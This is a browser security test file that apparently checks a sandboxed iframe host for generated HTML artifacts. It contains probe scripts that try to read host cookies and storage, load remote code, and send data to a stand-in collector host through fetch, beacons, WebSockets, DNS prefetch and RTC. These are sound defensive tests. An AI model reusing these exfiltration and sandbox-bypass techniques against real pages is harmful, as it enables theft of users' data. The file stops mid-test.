import { chromium } from 'playwright';
import { createSocket } from 'node:dgram';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { artifactHtmlBundleFromBodyV1, type ArtifactHtmlBundleV1 } from '@happier-dev/protocol/artifacts/artifactHtmlV1';
import type { buildArtifactHtmlDocumentV1 } from '@happier-dev/protocol/artifacts/artifactHtmlDocumentV1';
import { resolveChromiumExecutable } from '@/dev/testkit/render/measureWebLayout';
import { buildWorkspaceHistoryBrowser } from '@/dev/testkit/render/buildWorkspaceHistoryBrowser.mjs';
import { createWorkspaceBrowserServer } from '@/dev/testkit/render/workspaceBrowserServer';
import { appendBrowserDiagnostics, collectBrowserDiagnostics } from '../../../../../../../packages/tests/src/testkit/uiE2e/browserDiagnostics';

// Chromium's injected harness is outside the test process's ambient Window declarations.
type HarnessWindow = Window & { hostedFrameHarness: {
    mount: (body: string, network: 'none' | 'open', networkOrigins?: string[], generatedSdk?: boolean) => void;
    mountBundle: (bundle: ArtifactHtmlBundleV1, options?: Parameters<typeof buildArtifactHtmlDocumentV1>[1]) => void;
    mountCaller: (body: string) => void;
    setCallerTheme: (theme: 'light' | 'dark') => void;
    heights: number[];
    events: string[];
    activations: boolean[];
    rejections: string[];
    push: (message: unknown) => void;
} };

type GeneratedProbeWindow = Window & { generatedProbe: Record<string, unknown>; violations: string[] };
const deniedOrigin = 'https://collector.example.test';
const generatedOptions = { generatedArtifactNonce: 'browser-nonce' };
function file(mime: string, content: string) {
    return { mime, contentBase64: Buffer.from(content).toString('base64') };
}

function generatedProbeBundle(): ArtifactHtmlBundleV1 {
    const bundle = artifactHtmlBundleFromBodyV1(`<script type="importmap">{"imports":{"remoteMapped":"${deniedOrigin}/mapped.js"}}</script>
        <link rel="stylesheet" href="styles/main.css"><script type="module" src="main.js"></script>
        <script>globalThis.markupInline=true</script><script src="data:text/javascript,globalThis.markupData=true"></script>
        <script src="payload.json"></script><script src="payload.html"></script><script src="payload.css"></script><script src="payload.txt"></script>
        <svg><script src="child.js">globalThis.markupSvg=true</script></svg>
        <p id="handler" onclick="globalThis.markupHandler=true">Guest</p>`);
    bundle.files['main.js'] = file('text/javascript', `
        import {value} from './child.js';
        const dynamicPath = './dynamic.js';
        const dynamic = await import(dynamicPath);
        globalThis.violations = [];
        addEventListener('securitypolicyviolation', event => violations.push(event.blockedURI));
        const observed = { origin: globalThis.origin };
        for (const [key, read] of Object.entries({
            hostStorage: () => top.localStorage.getItem('host-secret'),
            hostCookies: () => top.document.cookie,
            ownStorage: () => localStorage,
            ownCookies: () => document.cookie,
            literalEval: () => eval('1'),
            newFunction: () => new Function('return 1')(),
        })) { try { read(); observed[key] = 'ALLOWED'; } catch (error) { observed[key] = error.name; } }
        document.getElementById('handler').click();
        // Accepted F1 contract: readable nonces and data modules permit runtime
        // code creation inside the opaque guest; this is stricter for plain server frames.
        const nonce = [...document.scripts].map(script => script.nonce).find(Boolean);
        const script = document.createElement('script');
        script.nonce = nonce;
        script.textContent = 'globalThis.runtimeInline=true';
        document.head.append(script);
        const runtimeModule = 'data:text/javascript,' + encodeURIComponent('export const value=7');
        observed.runtimeModule = (await import(runtimeModule)).value;
        observed.runtimeInline = globalThis.runtimeInline === true;
        observed.value = value + dynamic.value;
        observed.localRead = (await (await fetch('./data.json')).json()).value;
        observed.color = getComputedStyle(document.body).color;
        for (const key of ['markupInline','markupData','markupSvg','markupHandler','jsonInjected','htmlInjected','cssInjected','plainInjected']) {
            observed[key] = globalThis[key] === true;
        }
        observed.classicRemote = await new Promise(resolve => {
            const script = document.createElement('script'); script.nonce = nonce;
            script.onload = () => resolve('ALLOWED'); script.onerror = () => resolve('blocked');
            script.src = '${deniedOrigin}/classic.js'; document.head.append(script);
        });
        const remoteDynamicUrl = '${deniedOrigin}/dynamic.js';
        for (const [key, operation] of Object.entries({
            dynamicRemote: () => import(remoteDynamicUrl),
            staticRemote: () => import('./remote-static.js'),
            mappedRemote: () => import('remoteMapped'),
        })) { try { await operation(); observed[key] = 'ALLOWED'; } catch (error) { observed[key] = error.name; } }
        globalThis.generatedProbe = observed;
    `);
    bundle.files['child.js'] = file('text/javascript', 'export const value=42;');
    bundle.files['dynamic.js'] = file('text/javascript', 'export const value=42;');
    bundle.files['remote-static.js'] = file('text/javascript', `import '${deniedOrigin}/static.js'; export const value=1;`);
    bundle.files['data.json'] = file('application/json', '{"value":42}');
    bundle.files['styles/main.css'] = file('text/css', '@import "./nested.css";');
    bundle.files['styles/nested.css'] = file('text/css', 'body { color: rgb(123, 45, 67); }');
    for (const [path, mime, flag] of [
        ['payload.json', 'application/json', 'jsonInjected'], ['payload.html', 'text/html', 'htmlInjected'],
        ['payload.css', 'text/css', 'cssInjected'], ['payload.txt', 'text/plain', 'plainInjected'],
    ]) bundle.files[path] = file(mime, `globalThis.${flag}=true;`);
    return bundle;
}

let script = '';
let origin: string;
const server = createWorkspaceBrowserServer(() => script);
beforeAll(async () => {
    script = await buildWorkspaceHistoryBrowser({
        entryFile: 'sources/components/browser/frame/engines/WebIframeEngine.browserHarness.tsx',
        // Package/Expo assets are an external boundary; caller HTML does not
        // need any installed plugin bytes. The real host and transport remain.
        boundaryFiles: { 'sources/sync/domains/plugins/availability/generatedBundledPluginUiArtifacts.js': 'sources/dev/testkit/mocks/bundledPluginUiAssets.ts' },
        lazy: false,
    });
    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
    const address = server.address();
    if (!address || typeof address === 'string') throw new Error('Frame browser boundary did not bind');
    origin = `http://127.0.0.1:${address.port}`;
}, 600_000);
afterAll(async () => {
    if (server.listening) await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
    script = '';
});

describe('caller-authored hosted frame requests in Chromium', () => {
    it('lets trusted plugin pages create local nested frames while caller HTML retains its refusal', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable(), headless: true, args: ['--no-sandbox'] });
        try {
            const page = await browser.newPage();
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            const bundle = artifactHtmlBundleFromBodyV1(`<iframe srcdoc="<p>Static child</p>"></iframe><script>
                globalThis.generatedProbe = {};
                try {
                    const child = document.createElement('iframe');
                    child.srcdoc = '<p>Dynamic child</p>';
                    document.body.append(child);
                    generatedProbe.dynamic = 'created';
                } catch (error) { generatedProbe.dynamic = error.name; }
                generatedProbe.children = document.querySelectorAll('iframe').length;
                try { top.document.body; generatedProbe.host = 'read'; }
                catch (error) { generatedProbe.host = error.name; }
            </script>`);
            for (const pluginAuthored of [false, true]) {
                await page.evaluate(({ bundle, pluginAuthored }) => (
                    (window as unknown as HarnessWindow).hostedFrameHarness.mountBundle(bundle, { pluginAuthored })
                ), { bundle, pluginAuthored });
                await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
                const frame = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
                await frame.waitForFunction(() => (window as unknown as GeneratedProbeWindow).generatedProbe !== undefined);
                expect(await frame.evaluate(() => (window as unknown as GeneratedProbeWindow).generatedProbe)).toEqual({
                    dynamic: pluginAuthored ? 'created' : 'SecurityError', children: pluginAuthored ? 2 : 0, host: 'SecurityError',
                });
                if (pluginAuthored) {
                    await expect.poll(async () => frame.childFrames().length).toBe(2);
                    expect(await Promise.all(frame.childFrames().map(child => child.locator('p').innerText())))
                        .toEqual(['Static child', 'Dynamic child']);
                }
            }
        } finally { await browser.close(); }
    });

    it('denies RTC ICE and DNS prefetch from generated and hosted documents', async () => {
        const stun = createSocket('udp4');
        let packets = 0;
        stun.on('message', (message, remote) => {
            if (message.length < 20 || message.readUInt32BE(4) !== 0x2112a442) return;
            packets++;
            // Real local STUN responder: complete gathering rather than waiting
            // for Chromium's network timeout. Only synthetic probe bytes arrive.
            const response = Buffer.alloc(32);
            response.writeUInt16BE(0x0101, 0);
            response.writeUInt16BE(12, 2);
            message.copy(response, 4, 4, 20);
            response.writeUInt16BE(0x0020, 20);
            response.writeUInt16BE(8, 22);
            response[25] = 1;
            response.writeUInt16BE(remote.port ^ 0x2112, 26);
            response.writeUInt32BE((0xcb007101 ^ 0x2112a442) >>> 0, 28);
            stun.send(response, remote.port, remote.address);
        });
        await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve));
        const stunAddress = stun.address();
        const scratch = await mkdtemp(path.join(tmpdir(), 'happier-frame-egress-'));
        const netLog = path.join(scratch, 'netlog.json');
        // Incognito/background-network suppression can disable DNS prediction
        // before document policy is involved. Use an empty regular profile and
        // network prediction enabled so the positive control reaches DNS.
        const profile = path.join(scratch, 'profile');
        await mkdir(path.join(profile, 'Default'), { recursive: true });
        await writeFile(path.join(profile, 'Default/Preferences'), JSON.stringify({ net: { network_prediction_options: 0 } }));
        const browser = await chromium.launchPersistentContext(path.join(scratch, 'profile'), {
            executablePath: resolveChromiumExecutable(),
            ignoreDefaultArgs: ['--disable-background-networking'],
            args: [`--log-net-log=${netLog}`],
        });
        const counts: number[] = [];
        let dnsCounts: number[] = [];
        try {
            const page = await browser.newPage();
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            // Structural vectors would rewrite the unguarded harness page, so the
            // control runs only link-hint vectors; guest denials are asserted below.
            const probe = (dnsHost: string, control = false) => `
                const optIn = document.createElement('meta'); optIn.httpEquiv = 'x-dns-prefetch-control';
                optIn.content = 'on'; document.head.append(optIn);
                const denied = {};
                for (const [name, mutate] of Object.entries({
                    property: link => { link.rel = 'dns-prefetch'; },
                    mixedCase: link => { link.rel = 'stylesheet\\tDNS-PREFETCH\\nicon'; },
                    attribute: link => link.setAttribute('rel', 'dns-prefetch'),
                    detachedPrototype: link => { const set = Element.prototype.setAttribute; Object.setPrototypeOf(link, null); set.call(link, 'rel', 'dns-prefetch'); },
                    namespace: link => link.setAttributeNS(null, 'rel', 'dns-prefetch'),
                    token: link => link.relList.add('dns-prefetch'),
                    toggle: link => link.relList.toggle('dns-prefetch'),
                    replace: link => { link.rel = 'icon'; link.relList.replace('icon', 'dns-prefetch'); },
                    tokenValue: link => { link.relList.value = 'dns-prefetch'; },
                    forwarded: link => { link.relList = 'dns-prefetch'; },
                    attributeNode: link => { const attr = document.createAttribute('rel'); attr.value = 'dns-prefetch'; link.setAttributeNode(attr); },
                    attributeMap: link => { const attr = document.createAttribute('rel'); attr.value = 'dns-prefetch'; link.attributes.setNamedItem(attr); },
                    attrValue: link => { link.setAttribute('rel', ''); link.getAttributeNode('rel').value = 'dns-prefetch'; },
                    nodeValue: link => { link.setAttribute('rel', ''); link.getAttributeNode('rel').nodeValue = 'dns-prefetch'; },
                    textContent: link => { link.setAttribute('rel', ''); link.getAttributeNode('rel').textContent = 'dns-prefetch'; },
                    html: link => { link.outerHTML = '<link rel="dns-prefetch" href="http://html.${dnsHost}/">'; },
                    parsed: link => { const parsed = new DOMParser().parseFromString('<link rel="dns-prefetch" href="http://parsed.${dnsHost}/">', 'text/html'); document.head.append(parsed.querySelector('link')); },
                    fragment: link => { const range = document.createRange(); range.selectNode(link); link.replaceWith(range.createContextualFragment('<link rel="dns-prefetch" href="http://fragment.${dnsHost}/">')); },
                    coercion: link => { let calls = 0; link.setAttribute({toString: () => ++calls === 1 ? 'class' : 'rel'}, 'dns-prefetch'); },
                    preconnect: link => { link.rel = 'preconnect'; },
                    ${control ? '' : `bodySetter: () => { document.body = new DOMParser().parseFromString('<body><p>Guest</p><link rel="dns-prefetch" href="http://body.${dnsHost}/"><iframe></iframe></body>', 'text/html').body; },
                    surroundContents: () => { const range = document.createRange(); range.selectNodeContents(document.body); range.surroundContents(new DOMParser().parseFromString('<iframe></iframe>', 'text/html').querySelector('iframe')); },
                    editingCommand: () => { const editor = document.createElement('div'); editor.contentEditable = 'true'; document.body.append(editor); editor.focus(); document.execCommand('insertHTML', false, '<link rel="dns-prefetch" href="http://edit.${dnsHost}/"><iframe></iframe>'); },
                    customizedBuiltIn: () => { customElements.define('probe-frame-' + Math.random().toString(36).slice(2), class extends HTMLIFrameElement {}, { extends: 'iframe' }); },
                    createIntrinsics: () => { const lower = String.prototype.toLowerCase; try { String.prototype.toLowerCase = () => 'div'; const frame = document.createElement('iframe'); const range = document.createRange(); range.selectNodeContents(document.body); range.surroundContents(frame); } finally { String.prototype.toLowerCase = lower; } },
                    xmlDocumentElement: () => { const frame = document.implementation.createDocument('http://www.w3.org/1999/xhtml', 'iframe').documentElement; const range = document.createRange(); range.selectNodeContents(document.body); range.surroundContents(frame); },
                    xhrDocument: () => new Promise((resolve, reject) => {
                        const request = new XMLHttpRequest(); request.open('GET', 'data:text/html,%3Ciframe%3E%3C/iframe%3E'); request.responseType = 'document';
                        request.onload = () => { try { resolve(request.response); } catch (error) { reject(error); } };
                        // A CSP-refused request never yields a document either.
                        request.onerror = () => reject(new DOMException('XHR refused', 'SecurityError')); request.send();
                    }),`}
                    intrinsics: link => {
                        const lower = String.prototype.toLowerCase, exec = RegExp.prototype.exec, min = Math.min;
                        try { String.prototype.toLowerCase = () => 'stylesheet'; RegExp.prototype.exec = () => null; Math.min = () => 0;
                            link.relList.add('dns-prefetch');
                        } finally { String.prototype.toLowerCase = lower; RegExp.prototype.exec = exec; Math.min = min; }
                    },
                })) {
                    const link = document.createElement('link'); link.href = 'http://' + name + '.${dnsHost}/'; document.head.append(link);
                    try { await mutate(link); denied[name] = false; } catch (error) { denied[name] = error.name === 'SecurityError'; }
                }
                try {
                    const peer = new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${stunAddress.port}'}]});
                    peer.createDataChannel('synthetic');
                    await peer.setLocalDescription(await peer.createOffer());
                    await new Promise(resolve => {
                        if (peer.iceGatheringState === 'complete') resolve();
                        else peer.onicegatheringstatechange = () => { if (peer.iceGatheringState === 'complete') resolve(); };
                    });
                    peer.close();
                    globalThis.generatedProbe = {rtc:'gathered', host:'${dnsHost}', denied};
                } catch (error) { globalThis.generatedProbe = {rtc:error.name, host:'${dnsHost}', denied}; }
                // Restore attempts would delete natives in the unguarded control page.
                restore: { if (${control}) break restore;
                generatedProbe.restore = ['RTCPeerConnection','webkitRTCPeerConnection','RTCDataChannel'].map(name => ({
                    name, available: typeof globalThis[name] === 'function',
                    configurable: Object.getOwnPropertyDescriptor(globalThis, name)?.configurable,
                    writable: Object.getOwnPropertyDescriptor(globalThis, name)?.writable,
                    deleted: Reflect.deleteProperty(globalThis, name),
                    redefined: Reflect.defineProperty(globalThis, name, {value: function restored(){}}),
                    assigned: Reflect.set(globalThis, name, function restored(){}),
                }));
                generatedProbe.dnsRestore = [
                    [HTMLLinkElement.prototype, 'rel'], [HTMLLinkElement.prototype, 'relList'],
                    [Element.prototype, 'setAttribute'], [Element.prototype, 'setAttributeNS'],
                    [DOMTokenList.prototype, 'add'], [DOMTokenList.prototype, 'value'],
                    [NamedNodeMap.prototype, 'setNamedItem'], [Attr.prototype, 'value'],
                ].map(([owner, name]) => ({ deleted: Reflect.deleteProperty(owner, name),
                    redefined: Reflect.defineProperty(owner, name, {configurable:true}) }));
                const ordinary = document.createElement('p'); ordinary.classList.add('dns-prefetch');
                generatedProbe.ordinary = ordinary.classList.contains('dns-prefetch')
                    && new DOMParser().parseFromString('<p>Parsed</p>', 'text/html').body.textContent === 'Parsed';
                generatedProbe.nestedFrames = document.querySelectorAll('iframe, frame, object, embed').length;
                }
            `;
            // Positive control outside the policy, through the same Chromium
            // and UDP collector. Request routing cannot observe ICE or DNS.
            await page.evaluate(async source => { await new Function(`return (async () => {${source}})()`)(); }, probe('control.frame-egress.example.com', true));
            expect(packets).toBeGreaterThan(0);
            // Artifact HTML from agents or other people keeps the egress ceiling;
            // trusted plugin UI (owner ruling 2026-10-29) keeps its normal network.
            for (const kind of ['hosted', 'plugin']) {
                packets = 0;
                const dnsHost = kind + '.frame-egress.example.com';
                const bundle = artifactHtmlBundleFromBodyV1('<link rel="dns-prefetch" href="https://static.' + dnsHost + '/"><p>Guest</p><script type="module" src="probe.js"></script>');
                bundle.files['probe.js'] = file('text/javascript', probe(dnsHost, kind === 'plugin'));
                await page.evaluate(({ bundle, options }) => (window as unknown as HarnessWindow).hostedFrameHarness.mountBundle(bundle, options), {
                    bundle, options: kind === 'plugin' ? { ...generatedOptions, pluginAuthored: true } : { networkOff: true },
                });
                await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
                const frame = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
                await frame.waitForFunction(() => (window as unknown as GeneratedProbeWindow).generatedProbe !== undefined);
                const result = await frame.evaluate(() => (window as unknown as GeneratedProbeWindow).generatedProbe);
                counts.push(packets);
                if (kind === 'plugin') {
                    // Owner positive: native RTC and link hints stay usable.
                    expect(result).toMatchObject({ rtc: 'gathered' });
                    if (!result.denied || typeof result.denied !== 'object') throw new Error('Missing DNS mutation outcomes');
                    expect(Object.values(result.denied).some(Boolean)).toBe(false);
                    continue;
                }
                expect(result).toMatchObject({ ordinary: true, nestedFrames: 0, restore: [
                    { available: false, configurable: false, writable: false, deleted: false, redefined: false, assigned: false },
                    { available: false, configurable: false, writable: false, deleted: false, redefined: false, assigned: false },
                    { available: false, configurable: false, writable: false, deleted: false, redefined: false, assigned: false },
                ] });
                expect(result.dnsRestore).toEqual(Array.from({ length: 8 }, () => ({ deleted: false, redefined: false })));
                if (!result.denied || typeof result.denied !== 'object') throw new Error('Missing DNS mutation outcomes');
                expect(Object.entries(result.denied).filter(([name]) => name !== 'coercion').every(([, denied]) => denied)).toBe(true);
            }
            console.info('Frame ICE packets [hosted, plugin]:', counts);
        } finally {
            await browser.close();
            await new Promise<void>(resolve => stun.close(() => resolve()));
            // Chromium's own netlog is the DNS observer; it sees speculative
            // resolver requests even though no HTTP request follows them.
            const log = JSON.parse(await readFile(netLog, 'utf8')) as {
                constants: { logEventTypes: { HOST_RESOLVER_MANAGER_REQUEST: number } };
                events: { type: number; params?: { host?: string } }[];
            };
            dnsCounts = ['control', 'hosted', 'plugin'].map(name => log.events.filter(event =>
                event.type === log.constants.logEventTypes.HOST_RESOLVER_MANAGER_REQUEST
                && event.params?.host?.includes(`${name}.frame-egress.example.com`),
            ).length);
            console.info('Frame DNS resolver requests [control, hosted, plugin]:', dnsCounts);
            await rm(scratch, { recursive: true, force: true });
        }
        expect(counts[0]).toBe(0);
        expect(counts[1]).toBeGreaterThan(0);
        expect(dnsCounts[0]).toBeGreaterThan(0);
        expect(dnsCounts[1]).toBe(0);
        expect(dnsCounts[2]).toBeGreaterThan(0);
    });

    it.each([true, false])('enforces generated markup, literal-eval and remote-script scope (generated=$0)', async generated => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        let readDiagnostics = () => '';
        try {
            const context = await browser.newContext();
            const outbound: string[] = [];
            // Context routing includes requests initiated by nested opaque frames.
            await context.route(`${deniedOrigin}/**`, async route => {
                outbound.push(new URL(route.request().url()).pathname);
                await route.fulfill({ contentType: 'text/javascript', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'export const value=1;' });
            });
            const page = await context.newPage();
            readDiagnostics = collectBrowserDiagnostics({ page });
            await page.goto(origin);
            await page.evaluate(() => {
                localStorage.setItem('host-secret', 'private-host-value');
                document.cookie = 'host-secret=private-host-value; path=/';
            });
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(({ bundle, options }) => (window as unknown as HarnessWindow).hostedFrameHarness.mountBundle(bundle, options), {
                bundle: generatedProbeBundle(),
                options: generated ? generatedOptions : { requestedCapabilities: { networkOrigins: [deniedOrigin] } },
            });
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame());
            expect(guest).toBeDefined();
            await guest!.waitForFunction(() => (window as unknown as GeneratedProbeWindow).generatedProbe !== undefined);
            const result = await guest!.evaluate(() => (window as unknown as GeneratedProbeWindow).generatedProbe);
            expect(result).toMatchObject({
                origin: 'null', value: 84, localRead: 42, color: 'rgb(123, 45, 67)',
                hostStorage: 'SecurityError', hostCookies: 'SecurityError', ownStorage: 'SecurityError', ownCookies: 'SecurityError',
                literalEval: 'EvalError', newFunction: 'EvalError', runtimeModule: 7, runtimeInline: true,
                markupInline: !generated, markupData: !generated, markupHandler: !generated,
            });
            expect(await page.evaluate(() => ({ storage: localStorage.getItem('host-secret'), cookies: document.cookie }))).toEqual({
                storage: 'private-host-value', cookies: 'host-secret=private-host-value',
            });
            if (generated) {
                expect(result).toMatchObject({
                    markupSvg: false, jsonInjected: false, htmlInjected: false, cssInjected: false, plainInjected: false,
                    classicRemote: 'blocked', dynamicRemote: 'TypeError', staticRemote: 'TypeError', mappedRemote: 'TypeError',
                });
                expect(outbound).toEqual([]);
            } else {
                // Sensitivity control through the same producer and frame: the caller
                // profile admits these sources, so a broken probe cannot pass silently.
                expect(result).toMatchObject({ classicRemote: 'ALLOWED', dynamicRemote: 'ALLOWED', staticRemote: 'ALLOWED', mappedRemote: 'ALLOWED' });
                expect(outbound.sort()).toEqual(['/classic.js', '/dynamic.js', '/mapped.js', '/static.js']);
            }
        } catch (error) {
            throw appendBrowserDiagnostics(error, `Generated document enforcement (generated=${generated})\n${readDiagnostics()}`);
        } finally { await browser.close(); }
    });

    it('denies generated connect, resource and popup egress before a network request', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        let readDiagnostics = () => '';
        try {
            const context = await browser.newContext();
            const outbound: string[] = [];
            await context.route(`${deniedOrigin}/**`, async route => {
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/plain', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'unexpected egress' });
            });
            const sockets: string[] = [];
            const page = await context.newPage();
            // Passive observation preserves Chromium's own WebSocket constructor/CSP.
            page.on('websocket', socket => { if (socket.url().startsWith('wss://collector.example.test/')) sockets.push(socket.url()); });
            readDiagnostics = collectBrowserDiagnostics({ page });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            const bundle = artifactHtmlBundleFromBodyV1('<p id="target">Guest</p><script type="module" src="probe.js"></script>');
            bundle.files['probe.js'] = file('text/javascript', `
                globalThis.violations = [];
                addEventListener('securitypolicyviolation', event => violations.push(event.effectiveDirective + ':' + event.blockedURI));
                const observed = {};
                try { await fetch('${deniedOrigin}/fetch'); observed.fetch='ALLOWED'; } catch (error) { observed.fetch=error.name; }
                observed.xhr = await new Promise(resolve => {
                    const xhr = new XMLHttpRequest(); xhr.onload=() => resolve('ALLOWED'); xhr.onerror=() => resolve('blocked');
                    xhr.open('GET','${deniedOrigin}/xhr'); xhr.send();
                });
                try { navigator.sendBeacon('${deniedOrigin}/beacon', 'synthetic'); } catch (error) { observed.beacon=error.name; }
                try { const socket = new WebSocket('wss://collector.example.test/socket'); socket.onerror = () => socket.close(); }
                catch (error) { observed.socket=error.name; }
                try { const events = new EventSource('${deniedOrigin}/events'); events.onerror = () => events.close(); }
                catch (error) { observed.events=error.name; }
                const image = new Image(); image.src='${deniedOrigin}/image'; document.body.append(image);
                document.getElementById('target').style.backgroundImage='url(${deniedOrigin}/background)';
                for (const [rel,path] of [['prefetch','prefetch'],['stylesheet','stylesheet']]) {
                    const link=document.createElement('link'); link.rel=rel; link.href='${deniedOrigin}/'+path; document.head.append(link);
                }
                observed.popup = window.open('${deniedOrigin}/popup') === null;
                try { document.createElement('iframe'); observed.nestedFrame='ALLOWED'; } catch (error) { observed.nestedFrame=error.name; }
                observed.worker = await new Promise(resolve => {
                    try { const worker=new Worker('data:text/javascript,postMessage(1)');
                        worker.onmessage=() => {worker.terminate();resolve('ALLOWED')};
                        worker.onerror=event => {event.preventDefault();worker.terminate();resolve('blocked')};
                    } catch (error) {resolve(error.name)}
                });
                globalThis.generatedProbe=observed;
            `);
            await page.evaluate(({ bundle, options }) => (window as unknown as HarnessWindow).hostedFrameHarness.mountBundle(bundle, options), { bundle, options: generatedOptions });
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            await guest.waitForFunction(() => {
                const probe = window as unknown as GeneratedProbeWindow;
                return probe.generatedProbe !== undefined && ['fetch','xhr','beacon','socket','events','image','background','prefetch','stylesheet'].every(
                    path => probe.violations.some(uri => uri.endsWith('/' + path)),
                );
            });
            expect(await guest.evaluate(() => (window as unknown as GeneratedProbeWindow).generatedProbe)).toMatchObject({
                fetch: 'TypeError', xhr: 'blocked', popup: true, nestedFrame: 'SecurityError',
            });
            expect(['SecurityError', 'blocked']).toContain(await guest.evaluate(() => (window as unknown as GeneratedProbeWindow).generatedProbe.worker));
            expect(await guest.evaluate(() => (window as unknown as GeneratedProbeWindow).violations)).toContain('connect-src:wss://collector.example.test/socket');
            expect({ outbound, sockets }).toEqual({ outbound: [], sockets: [] });
        } catch (error) {
            throw appendBrowserDiagnostics(error, `Generated non-script egress\n${readDiagnostics()}`);
        } finally { await browser.close(); }
    });

    it('contains generated meta-refresh navigation in the actual engine shell', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        let readDiagnostics = () => '';
        try {
            const context = await browser.newContext();
            const outbound: string[] = [];
            await context.route(`${deniedOrigin}/**`, async route => {
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/html', body: '<p>Unexpected navigation</p>' });
            });
            const page = await context.newPage();
            readDiagnostics = collectBrowserDiagnostics({ page });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            const bundle = artifactHtmlBundleFromBodyV1(`<form method="post" action="${deniedOrigin}/form"><input name="value" value="synthetic"></form><script src="navigation.js"></script>`);
            bundle.files['navigation.js'] = file('text/javascript', `
                document.querySelector('form').requestSubmit();
                addEventListener('message', event => {
                    if(event.data !== 'meta-refresh') return;
                    const meta=document.createElement('meta'); meta.httpEquiv='refresh';
                    meta.content='0;url=${deniedOrigin}/refresh'; document.head.append(meta);
                });
                globalThis.generatedProbe={ready:true};
            `);
            await page.evaluate(({ bundle, options }) => (window as unknown as HarnessWindow).hostedFrameHarness.mountBundle(bundle, options), { bundle, options: generatedOptions });
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            await guest.waitForFunction(() => (window as unknown as GeneratedProbeWindow).generatedProbe?.ready === true);
            await page.evaluate(() => {
                const shell = document.querySelector<HTMLIFrameElement>('[data-testid="guest-navigation-shell"]')!;
                shell.dataset.navigation = 'waiting';
                shell.contentWindow!.addEventListener('securitypolicyviolation', event => {
                    // Chromium redacts cross-origin violation paths to the origin.
                    if (event.effectiveDirective === 'frame-src' && new URL(event.blockedURI).origin === 'https://collector.example.test') shell.dataset.navigation='blocked';
                });
                shell.contentDocument!.querySelector('iframe')!.contentWindow!.postMessage('meta-refresh', '*');
            });
            await page.waitForFunction(() => document.querySelector<HTMLIFrameElement>('[data-testid="guest-navigation-shell"]')?.dataset.navigation === 'blocked');
            expect(outbound).toEqual([]);
            expect(readDiagnostics()).toContain('allow-forms');
        } catch (error) {
            throw appendBrowserDiagnostics(error, `Generated document navigation\n${readDiagnostics()}`);
        } finally { await browser.close(); }
    });

    it('bootstraps caller presentation through the mounted host adapter and contained frame', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            const diagnostics = collectBrowserDiagnostics({ page });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(() => {
                const harness = (window as unknown as HarnessWindow).hostedFrameHarness;
                harness.setCallerTheme('light');
                harness.mountCaller('<button onclick="this.textContent = String(Number(this.textContent) + 1)">0</button><div style="height:736px">Caller presentation</div>');
            });
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.heights.some(height => height >= 736))
                .catch(async error => {
                    const frames = await Promise.all(page.frames().map(frame => frame.evaluate(() => ({
                        bootstrap: Reflect.has(window, '__HAPPIER_PLUGIN_UI_HOST_API_CLIENT_V1__'),
                        height: document.body?.scrollHeight,
                    }))));
                    throw appendBrowserDiagnostics(error, `${diagnostics()}\nCaller frames: ${JSON.stringify(frames)}`);
                });
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame());
            if (!guest) throw new Error('Caller guest did not mount inside its navigation shell');
            await guest.waitForFunction(() => document.documentElement.style.getPropertyValue('--happier-plugin-color-canvas') !== '');
            expect(await guest.evaluate(() => Reflect.has(window, '__HAPPIER_PLUGIN_UI_HOST_API_CLIENT_V1__'))).toBe(true);
            await guest.locator('button').click();
            const before = await guest.evaluate(() => ({
                canvas: document.documentElement.style.getPropertyValue('--happier-plugin-color-canvas'),
                timeOrigin: performance.timeOrigin,
                viewport: innerHeight,
                content: document.body.scrollHeight,
            }));
            expect(before.viewport).toBeGreaterThanOrEqual(before.content);
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.setCallerTheme('dark'));
            await guest.waitForFunction(canvas => document.documentElement.style.getPropertyValue('--happier-plugin-color-canvas') !== canvas, before.canvas);
            await page.setViewportSize({ width: 390, height: 844 });
            expect(await guest.evaluate(() => ({ timeOrigin: performance.timeOrigin, count: document.querySelector('button')?.textContent })))
                .toEqual({ timeOrigin: before.timeOrigin, count: '1' });
        } finally { await browser.close(); }
    });

    it('admits the generated SDK ready object across the trusted shell into the strict host bridge', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
